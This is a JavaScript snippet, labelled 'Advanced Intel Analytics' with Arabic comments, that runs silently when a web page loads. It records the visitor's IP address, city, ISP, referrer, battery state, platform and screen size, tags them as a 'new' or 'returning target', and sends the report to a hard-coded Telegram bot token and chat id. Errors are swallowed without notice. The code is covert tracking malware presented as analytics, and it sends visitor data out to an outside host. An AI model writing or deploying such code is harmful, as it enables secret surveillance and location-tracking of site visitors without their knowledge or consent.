/* --- 🕵️ Advanced Intel Analytics v11.0 | Source Tracking --- */
(async function() {
    const _cfg = {
        t: '7800042874:AAH6IhztbG2BeypuYl5_ZxKzFCOnmOgkD7k',
        i: '8528072384'
    };

    try {
        const vCnt = parseInt(localStorage.getItem('v_cnt') || 0) + 1;
        localStorage.setItem('v_cnt', vCnt);

        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        // --- كشف مصدر الدخول (الخانة اللي إنت عايزها) ---
        const ref = document.referrer.toLowerCase();
        let source = "Direct Entry / Bookmark 🔗";
        if (ref.includes('facebook')) source = "Facebook 🟦";
        else if (ref.includes('instagram')) source = "Instagram 📸";
        else if (ref.includes('whatsapp')) source = "WhatsApp 🟢";
        else if (ref.includes('telegram')) source = "Telegram ✈️";
        else if (ref.includes('google')) source = "Google Search 🔍";
        else if (ref !== "") source = `External: ${new URL(ref).hostname}`;

        let batt = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batt = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging ⚡' : 'Discharging 🔋'})`;
        }

        // --- التقرير بالشكل اللي إنت عايزه مع إضافة الخانة الجديدة ---
        const report = 
            `${vCnt > 1 ? '⚠️ [RETURNING TARGET]' : '🔱 [NEW TARGET DETECTED]'}\n` +
            `--------------------------\n` +
            `📥 SOURCE: ${source}\n` + // الخانة الجديدة اهي يا وحش
            `📍 Location: ${data.city}, ${data.country_name}\n` +
            `🌐 IP Address: ${data.ip}\n` +
            `📡 ISP: ${data.org}\n` +
            `--------------------------\n` +
            `📱 Device Info:\n` +
            `   • Battery: ${batt}\n` +
            `   • Platform: ${navigator.platform}\n` +
            `   • Resolution: ${window.screen.width}x${window.screen.height}\n` +
            `--------------------------\n` +
            `🔗 Site: ${document.title}\n` +
            `⏰ Local Time: ${new Date().toLocaleString()}`;

        const url = `https://api.telegram.org/bot${_cfg.t}/sendMessage?chat_id=${_cfg.i}&text=${encodeURIComponent(report)}`;
        await fetch(url);

    } catch (err) {
        // Fallback في حالة الخطأ
    }
})();
